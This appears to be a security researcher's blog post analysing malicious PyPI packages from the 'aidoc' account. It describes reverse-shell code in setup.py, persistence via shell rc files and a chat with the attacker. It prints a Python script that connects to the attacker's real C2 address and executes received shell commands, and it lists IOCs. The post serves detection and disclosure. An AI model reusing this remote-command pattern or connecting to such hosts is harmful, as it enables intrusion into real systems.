@@ -1,0 +1,123 @@
+
+Chat With a Software Supply Chain attacker
+Jossef Harush Kadouri
+Follow
+Checkmarx Zero
+327
+5
+Listen
+Share
+
+A PyPi user account, aidoc, was found to have been publishing malicious packages
+The malicious code in the packages opens a remote shell on the victim’s machine and uses a simple persistence mechanism by appending the malicious command to the “.bashrc” and “.zshrc” files.
+I conducted a proactive experiment on a virtual machine and was able to interact with the attacker via Python script.
+
+Background
+Over the past few years, my team’s mission has been to fight software supply chain hackers who attack developers and users through open-source code. Our goal is to detect as soon as possible and report the relevant security teams to jam their operations.
+To support our mission, my team created an automated package analysis pipeline, which scans new packages as soon as they are uploaded to the open-source ecosystem.
+One of our engines is called “Watchdog”. This engine is aware of known-as-bad user accounts which previously published malicious packages. This engine brings useful context when such user accounts make new contributions and out of the many user accounts in our “naughty list”, one PyPi user account aidoc (first seen in August 2022) pops up again out of nowhere and starts dropping more of the same. We’re on it, but heads up, this guy’s dangerous.
+In addition, another engine my team integrated into our analysis pipeline is called “Groot”, a dynamic analysis engine (sandbox). The purpose of this engine is to thoroughly detonate and analyze open-source packages by installing, importing, and using SAST tools to invoke functionality within.
+This engine results in a full audit of the package’s behavior, including any files created, subprocesses launched, network communications (including TLS traffic), and other useful insights.
+What’s Inside the Package?
+Upon receiving a prioritized signal from our analysis pipeline, I manually inspected the newly published packages.
+The malicious code is placed in the “setup.py” script and executed upon installation. The attacker used function names referring to users as victims such as identifyVictim()and it appears the purpose is to open a remote shell on the victim’s machine. The attacker tried to hide the command by encoding it as base64
+which decodes to
+a simple command to initiate remote shell receiving commands from IP address 3.221.152.203 on port 771
+In addition, a simple persistence mechanism was used by appending his malicious base64-encoded command to the end of “.bashrc” and “.zshrc” files.
+Proactive Experiment
+I decided to perform a proactive experiment on a virtual machine I created for the task. I started by infecting the virtual machine with one of the malicious packages by running the command:
+It didn’t take too long before I saw the attacker writing files to disk and reading sensitive files.
+After letting the attacker play with my virtual machine, I decided to take it to the next level by writing a Python script that connects to the attacker’s C2 server using a raw socket and waits to receive a new command.
+When such a command is received, the script prompts my confirmation to execute; otherwise, allowing me to type whatever made-up output I decide.
+	import socket
+	import subprocess
+	
+	
+	def main():
+	ip_address = '3.221.152.203'
+	port = 771
+	print(f'connecting to {ip_address}:{port}')
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server_address = (ip_address, port)
+	sock.connect(server_address)
+	
+	while True:
+	data = sock.recv(2048)
+	command = data.decode()
+	print(f'received command from attacker: {command}')
+	if input(f'execute command?: ').lower() not in {'y', 'yes'}:
+	stdout = input(f'fake output: ')
+	stdout = stdout.encode()
+	sock.sendall(stdout)
+	continue
+	
+	process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+	stdout, stderr = process.communicate()
+	print(f'command output: {stdout.decode()}')
+	if input(f'send command output?: ').lower() not in {'y', 'yes'}:
+	break
+	
+	sock.sendall(stdout)
+	sock.close()
+	
+	
+	if __name__ == '__main__':
+	main()
+
+This is my dialog with the attacker on the other end:
+In our exchange, the attacker claimed to be a security researcher who was “checking Internal systems. Dependency confusion you know.” and said that “If not our system, I am killing the shell and drop the connection.”
+I know this attacker did more than he claims as our dynamic analysis engine observed him dropping new files and executing commands to read sensitive files such as “cat /etc/passwd”.
+Not to mention that security researchers usually don’t infect other machines with reverse shells and connect interactively.
+panic_mode: true
+Shortly after our conversation, I noticed the attacker published new versions to all packages owned by PyPi user account aidoc, omitting the word “victim” and removing the remote shell code, leaving what appears to be a simple beacon to indicate to the server that one of the packages was installed.
+Although no “DO NOT RUN” warnings and disclaimers exist, I consider this package more suitable for research purposes.
+Code of Conduct
+Claiming to be a security researcher is not a free pass, if your actions are not in alignment with the standards expected of one.
+If the person behind this attack is indeed a security engineer, then it seems suspicious to us that they failed to declare their intent and identity as a security professional. Moreover, the reverse shell functionality, as well as other actions described in this blog, are not in alignment with what is expected from a security researcher.
+Incidents in which actions of individuals claiming to be security professionals caused severe damages, such as the poisoning of the popular “ctx” Python package, raise the topic of a certain “code of conduct”
+for security researchers in the field of open-source security. I recommend reading this story discussing the dos and don’ts when performing malicious package research.
+Conclusion
+Don’t get mistaken, it’s not a malicious package problem. It’s an attacker's problem.
+Apparently, this threat actor was targeting aidoc.com, which is an Israeli startup in the field of healthcare artificial intelligence. I have reached out to the company’s CISO and executives to inform them that someone might be targeting their organization (as the packages prefixed “aidoc-“ and the user account “aidoc”).
+In addition, I reported this activity to PyPi’s security team and they removed the malicious packages.
+My team will continue to monitor the ecosystem for attackers and to continue working together to keep the ecosystem safe.
+IOCs
+
+3[.]129.111.79
+3[.]221.152.203
+hxxp://3[.]221.152.203:8000/acl/package/*
+Packages
+
+	Jan 15, 2023 @ 17:30:02.112	aidoc-transit	5.2.4	pypi/aidoc	pypi
+	Jan 15, 2023 @ 16:27:04.363	aidoc-transit	5.2.3	pypi/aidoc	pypi
+	Jan 11, 2023 @ 16:09:01.676	aidoc-transit	5.2.2	pypi/aidoc	pypi
+	Jan 10, 2023 @ 20:51:09.394	aidoc-transit	5.2.1	pypi/aidoc	pypi
+	Dec 29, 2022 @ 20:06:08.912	aidoc-e2e-utils	5.0.3	pypi/aidoc	pypi
+	Dec 29, 2022 @ 20:00:05.994	aidoc.genmfa	3.0.3	pypi/aidoc	pypi
+	Dec 29, 2022 @ 19:57:04.130	aidoc-consul	5.2.0	pypi/aidoc	pypi
+	Dec 29, 2022 @ 04:45:04.156	aidoc.genmfa	3.0.2	pypi/aidoc	pypi
+	Dec 29, 2022 @ 04:39:05.953	aidoc-e2e-utils	5.0.2	pypi/aidoc	pypi
+	Dec 29, 2022 @ 04:30:01.884	aidoc-consul	5.1.0	pypi/aidoc	pypi
+	Dec 29, 2022 @ 04:21:01.762	aidoc-e2e-utils	5.0.1	pypi/aidoc	pypi
+	Dec 29, 2022 @ 04:15:05.640	aidoc-e2e-utils	5.0.0	pypi/aidoc	pypi
+	Dec 29, 2022 @ 03:39:01.894	aidoc-consul	5.0.9	pypi/aidoc	pypi
+	Dec 29, 2022 @ 03:33:03.555	aidoc-consul	5.0.8	pypi/aidoc	pypi
+	Dec 29, 2022 @ 03:06:05.374	aidoc-consul	5.0.7	pypi/aidoc	pypi
+	Dec 29, 2022 @ 03:06:01.836	aidoc.genmfa	3.0.1	pypi/aidoc	pypi
+	Dec 29, 2022 @ 02:57:01.627	aidoc.genmfa	3.0.0	pypi/aidoc	pypi
+	Dec 29, 2022 @ 02:36:02.130	aidoc-consul	5.0.6	pypi/aidoc	pypi
+	Dec 29, 2022 @ 02:15:10.735	aidoc-consul	5.0.5	pypi/aidoc	pypi
+	Dec 29, 2022 @ 02:12:01.896	aidoc-consul	5.0.4	pypi/aidoc	pypi
+	Dec 29, 2022 @ 02:03:04.716	aidoc-consul	5.0.3	pypi/aidoc	pypi
+	Dec 29, 2022 @ 01:57:01.773	aidoc-consul	5.0.2	pypi/aidoc	pypi
+	Dec 29, 2022 @ 01:48:01.986	aidoc-consul	5.0.1	pypi/aidoc	pypi
+	Dec 29, 2022 @ 01:36:01.574	aidoc-consul	5.0.0	pypi/aidoc	pypi
+	Dec 29, 2022 @ 01:27:05.449	aidoc-consul	79.0.0	pypi/aidoc	pypi
+	Dec 23, 2022 @ 01:00:02.191	aidoc-consul	9999.9999.999	pypi/aidoc	pypi
+	Dec 23, 2022 @ 00:57:05.635	aidoc-consul	999.9999.999	pypi/aidoc	pypi
+	Dec 22, 2022 @ 23:24:04.920	aidoc-consul	999.999.999	pypi/aidoc	pypi
+	Aug 1, 2022 @ 14:37:22.079	aidoc-consul	99.999.999	pypi/aidoc	pypi
+	Aug 1, 2022 @ 14:23:16.970	aidoc-consul	99.999.99	pypi/aidoc	pypi
+	Aug 1, 2022 @ 13:22:28.940	aidoc-consul	99.99.99	pypi/aidoc	pypi
+
+identifyVictim()
